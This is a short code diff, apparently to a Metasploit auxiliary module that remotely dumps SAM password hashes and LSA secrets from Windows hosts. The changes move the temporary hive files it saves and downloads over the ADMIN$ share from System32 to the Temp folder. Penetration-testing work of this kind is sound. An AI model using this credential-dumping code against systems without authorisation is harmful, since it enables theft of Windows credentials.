@@ -36,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
           Dumps SAM hashes and LSA secrets (including cached creds) from the
           remote Windows target without executing any agent locally. First, it
           reads as much data as possible from the registry and then save the
-          hives locally on the target (%SYSTEMROOT%\random.tmp). Finally, it
+          hives locally on the target (%SYSTEMROOT%\Temp\random.tmp). Finally, it
           downloads the temporary hive files and reads the rest of the data
           from it. This temporary files are removed when it's done.
 
@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
 
     file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.tmp"
     vprint_status("Save key to #{file_name}")
-    @winreg.save_key(new_key_handle, file_name)
+    @winreg.save_key(new_key_handle, "..\\Temp\\#{file_name}")
     file_name
   ensure
     @winreg.close_key(new_key_handle) if new_key_handle
@@ -172,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
   def retrieve_hive(hive_name)
     file_name = save_registry_key(hive_name)
     tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
-    file = tree2.open_file(filename: "System32\\#{file_name}", delete: true, read: true)
+    file = tree2.open_file(filename: "Temp\\#{file_name}", delete: true, read: true)
     file.read
   ensure
     file.delete if file
